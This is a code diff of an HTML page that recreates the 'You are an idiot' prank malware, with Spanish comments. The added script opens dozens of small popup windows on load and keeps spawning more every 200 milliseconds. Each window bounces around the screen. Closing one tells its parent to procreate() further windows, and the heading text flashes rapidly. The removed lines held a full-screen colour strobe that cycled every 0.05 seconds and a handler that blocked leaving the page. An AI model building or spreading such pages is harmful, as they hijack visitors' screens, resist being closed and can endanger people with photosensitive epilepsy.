@@ -2,56 +2,64 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>⚠</title>
-<script src="you.js"></script>
+<title>!</title>
 <style>
-* { margin: 0; padding: 0; }
-body { 
-    overflow: hidden; 
-    background: #ffffff;
-    width: 100vw; height: 100vh;
-    cursor: none;
-}
-#main {
-    width: 100vw; height: 100vh;
-    display: flex; flex-direction: column;
-    align-items: center; justify-content: center;
-    text-align: center;
-    user-select: none;
-    animation: hyperStrobe 0.05s infinite;
-}
-@keyframes hyperStrobe {
-    0%   { background: #ff0000; }
-    10%  { background: #00ff00; }
-    20%  { background: #0000ff; }
-    30%  { background: #ffff00; }
-    40%  { background: #ff00ff; }
-    50%  { background: #00ffff; }
-    60%  { background: #ffffff; }
-    70%  { background: #000000; }
-    80%  { background: #ff6600; }
-    90%  { background: #9900ff; }
-    100% { background: #ff0000; }
-}
-h2 {
-    font-size: 4vw;
-    font-family: Arial, sans-serif;
-    font-weight: bold;
-    animation: flash 0.1s infinite;
-}
-@keyframes flash {
-    0%, 100% { opacity: 1; color: #000; transform: scale(1); }
-    25% { opacity: 0; color: #f00; transform: scale(2); }
-    50% { opacity: 1; color: #fff; transform: scale(0.5); }
-    75% { opacity: 0; color: #0f0; transform: scale(1.5); }
-}
+*{margin:0;padding:0}
+body{background:#fff;overflow:hidden;cursor:none;width:100vw;height:100vh}
+h2{font-size:18px;font-family:Arial;text-align:center;margin-top:40%;animation:f .1s infinite}
+@keyframes f{0%,100%{opacity:1}50%{opacity:0}}
 </style>
 </head>
-<body onload="flagRun=1;playBall();return true;" onunload="procreate()" onbeforeunload="return false">
+<body onunload="if(window.opener&&window.opener.procreate)window.opener.procreate()">
 
-<div id="main">
-    <h2>⚠ YOU ARE AN IDIOT ⚠</h2>
-</div>
+<h2>YOU ARE AN IDIOT</h2>
+
+<script>
+// Esta ventana también dispara popups desde su propio contexto
+var totalLocal = 0;
+
+function abrirDesdeAqui() {
+    if (totalLocal > 100) return;
+    totalLocal++;
+    try {
+        var p = window.open('open.html', 'sub_' + Date.now() + '_' + Math.random(),
+            'width=180,height=175,left=' + (Math.random()*screen.width) + ',top=' + (Math.random()*screen.height));
+        if (p) {
+            // Hacerla bailar
+            (function(pp) {
+                var x = Math.random()*screen.width, y = Math.random()*screen.height;
+                var dx = (Math.random()-0.5)*25, dy = (Math.random()-0.5)*25;
+                function baila() {
+                    if (!pp || pp.closed) return;
+                    try {
+                        x+=dx; y+=dy;
+                        if(x<0||x>screen.width-180)dx*=-1;
+                        if(y<0||y>screen.height-175)dy*=-1;
+                        pp.moveTo(Math.round(x),Math.round(y));
+                        setTimeout(baila, 10);
+                    } catch(e) { setTimeout(baila, 100); }
+                }
+                baila();
+            })(p);
+        }
+    } catch(e) {}
+}
+
+// Abrir más desde aquí
+for (var i = 0; i < 50; i++) {
+    setTimeout(abrirDesdeAqui, i * 30);
+}
+
+// Y seguir abriendo
+setInterval(abrirDesdeAqui, 200);
+
+// Al cerrar, avisar al padre
+window.onunload = function() {
+    if (window.opener && window.opener.procreate) {
+        window.opener.procreate();
+    }
+};
+</script>
 
 </body>
 </html>
